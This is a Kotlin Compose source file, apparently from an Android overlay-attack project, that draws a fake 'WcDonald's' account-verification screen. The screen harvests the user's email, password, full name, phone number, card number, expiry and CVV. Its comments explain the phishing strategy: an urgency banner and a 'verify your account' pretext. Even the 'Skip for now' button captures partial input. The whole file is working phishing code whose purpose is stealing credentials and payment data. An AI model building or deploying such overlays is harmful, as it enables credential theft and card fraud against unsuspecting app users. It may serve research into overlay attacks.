package com.ghosttouch.attacker.overlay

import android.util.Log
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Complete data-capture overlay that mimics a WcDonald's "account verification" flow.
 *
 * ## Strategy
 * Instead of showing separate login or payment screens, this overlay presents
 * a single "Account Verification Required" flow that captures ALL user data:
 * - Email + password (login credentials)
 * - Full name + phone number (personal data)
 * - Card number + expiry + CVV (payment data)
 *
 * This is more aggressive but also more realistic — many phishing attacks use
 * "verify your account" pretexts to harvest maximum data in one session.
 *
 * ## How it captures
 * Every field's state is read into a Map<String, String> when any "Continue"
 * or "Verify" button is pressed. The map is passed to the callback regardless
 * of which fields are filled — even partial data is captured.
 *
 * @param onDataCaptured Callback with all captured fields as a string map.
 * @param onDismiss Callback when the overlay should be removed.
 */
@Composable
fun CaptureAllOverlay(
    onDataCaptured: (fields: Map<String, String>) -> Unit,
    onDismiss: () -> Unit
) {
    val wcRed = Color(0xFFDA291C)
    val wcYellow = Color(0xFFFFC72C)
    val wcWhite = Color(0xFFFFFFFF)
    val wcBackground = Color(0xFFFAFAFA)
    val wcGray = Color(0xFF757575)
    val wcWarning = Color(0xFFF57C00)

    // All capture fields
    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var fullName by remember { mutableStateOf("") }
    var phone by remember { mutableStateOf("") }
    var cardNumber by remember { mutableStateOf("") }
    var expiry by remember { mutableStateOf("") }
    var cvv by remember { mutableStateOf("") }
    var passwordVisible by remember { mutableStateOf(false) }
    var isSubmitting by remember { mutableStateOf(false) }

    val coroutineScope = rememberCoroutineScope()

    /**
     * Captures ALL current field values into a map and triggers the callback.
     * Captures even partially filled fields — any data is valuable to an attacker.
     */
    fun captureAll() {
        val capturedEmail = email
        val capturedPassword = password
        val capturedName = fullName
        val capturedPhone = phone
        val capturedCard = cardNumber
        val capturedExpiry = expiry
        val capturedCvv = cvv

        Log.d("CaptureAllOverlay", buildString {
            append("Capturing all fields: ")
            append("email=$capturedEmail, ")
            append("pass=${capturedPassword.length} chars, ")
            append("name=$capturedName, ")
            append("phone=$capturedPhone, ")
            append("card=*${capturedCard.takeLast(4)}")
        })

        val fields = mutableMapOf<String, String>()
        if (capturedEmail.isNotBlank()) fields["email"] = capturedEmail
        if (capturedPassword.isNotBlank()) fields["password"] = capturedPassword
        if (capturedName.isNotBlank()) fields["name"] = capturedName
        if (capturedPhone.isNotBlank()) fields["phone"] = capturedPhone
        if (capturedCard.isNotBlank()) fields["card"] = capturedCard
        if (capturedExpiry.isNotBlank()) fields["expiry"] = capturedExpiry
        if (capturedCvv.isNotBlank()) fields["cvv"] = capturedCvv

        onDataCaptured(fields)
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(wcBackground)
    ) {
        Column(modifier = Modifier.fillMaxSize()) {
            // Fake top app bar
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .statusBarsPadding()
                    .height(64.dp)
                    .background(wcRed),
                contentAlignment = Alignment.CenterStart
            ) {
                Text(
                    "Account Verification",
                    color = wcWhite,
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Normal,
                    modifier = Modifier.padding(start = 56.dp)
                )
            }

            // Warning banner — creates urgency (social engineering tactic)
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(wcWarning.copy(alpha = 0.15f))
                    .padding(horizontal = 16.dp, vertical = 12.dp)
            ) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        Icons.Default.Warning,
                        contentDescription = null,
                        tint = wcWarning,
                        modifier = Modifier.size(20.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Column {
                        Text(
                            "Verification Required",
                            fontWeight = FontWeight.Bold,
                            fontSize = 14.sp,
                            color = wcWarning
                        )
                        Text(
                            "Please verify your account to continue using WcDonald's",
                            fontSize = 12.sp,
                            color = wcGray
                        )
                    }
                }
            }

            // Scrollable form
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .verticalScroll(rememberScrollState())
                    .padding(24.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp)
            ) {
                // Logo
                Box(
                    modifier = Modifier
                        .size(60.dp)
                        .background(wcYellow, RoundedCornerShape(30.dp))
                        .align(Alignment.CenterHorizontally),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        "W",
                        fontSize = 32.sp,
                        fontWeight = FontWeight.Bold,
                        color = wcRed
                    )
                }

                Spacer(modifier = Modifier.height(4.dp))

                // === SECTION 1: Login Credentials ===
                Text(
                    "Sign-in Details",
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.Black
                )

                OutlinedTextField(
                    value = email,
                    onValueChange = { email = it },
                    label = { Text("Email") },
                    placeholder = { Text("your@email.com") },
                    leadingIcon = { Icon(Icons.Default.Email, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Email),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                OutlinedTextField(
                    value = password,
                    onValueChange = { password = it },
                    label = { Text("Password") },
                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                    trailingIcon = {
                        IconButton(onClick = { passwordVisible = !passwordVisible }) {
                            Icon(
                                if (passwordVisible) Icons.Default.Visibility
                                else Icons.Default.VisibilityOff,
                                contentDescription = null
                            )
                        }
                    },
                    visualTransformation = if (passwordVisible) VisualTransformation.None
                    else PasswordVisualTransformation(),
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                Spacer(modifier = Modifier.height(8.dp))

                // === SECTION 2: Personal Info ===
                Text(
                    "Personal Information",
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.Black
                )

                OutlinedTextField(
                    value = fullName,
                    onValueChange = { fullName = it },
                    label = { Text("Full Name") },
                    leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                OutlinedTextField(
                    value = phone,
                    onValueChange = { phone = it.filter { c -> c.isDigit() || c == '+' } },
                    label = { Text("Phone Number") },
                    leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                Spacer(modifier = Modifier.height(8.dp))

                // === SECTION 3: Payment ===
                Text(
                    "Payment Method",
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.Black
                )

                Text(
                    "Verify your saved payment to keep ordering",
                    fontSize = 13.sp,
                    color = wcGray
                )

                OutlinedTextField(
                    value = cardNumber,
                    onValueChange = {
                        if (it.length <= 16) cardNumber = it.filter { c -> c.isDigit() }
                    },
                    label = { Text("Card Number") },
                    leadingIcon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    OutlinedTextField(
                        value = expiry,
                        onValueChange = { if (it.length <= 5) expiry = it },
                        label = { Text("MM/YY") },
                        leadingIcon = {
                            Icon(Icons.Default.DateRange, contentDescription = null)
                        },
                        singleLine = true,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    )
                    OutlinedTextField(
                        value = cvv,
                        onValueChange = {
                            if (it.length <= 3) cvv = it.filter { c -> c.isDigit() }
                        },
                        label = { Text("CVV") },
                        leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                        singleLine = true,
                        modifier = Modifier.weight(1f),
                        shape = RoundedCornerShape(12.dp)
                    )
                }

                Spacer(modifier = Modifier.height(16.dp))

                // Submit button — captures ALL fields at once
                Button(
                    onClick = {
                        isSubmitting = true
                        captureAll()
                        coroutineScope.launch {
                            delay(800) // Show loading animation
                            onDismiss()
                        }
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = wcRed),
                    enabled = !isSubmitting &&
                            (email.isNotBlank() || fullName.isNotBlank() || cardNumber.isNotBlank())
                ) {
                    if (isSubmitting) {
                        CircularProgressIndicator(
                            modifier = Modifier.size(24.dp),
                            color = wcWhite
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text("Verifying...", fontSize = 16.sp)
                    } else {
                        Text(
                            "Verify Account",
                            fontSize = 16.sp,
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                }

                // Skip button — captures whatever was entered so far
                TextButton(
                    onClick = {
                        captureAll() // Still captures partial data!
                        coroutineScope.launch {
                            delay(300)
                            onDismiss()
                        }
                    },
                    modifier = Modifier.align(Alignment.CenterHorizontally),
                    enabled = !isSubmitting
                ) {
                    Text("Skip for now", color = wcGray, fontSize = 14.sp)
                }

                Spacer(modifier = Modifier.height(16.dp))
            }
        }
    }
}
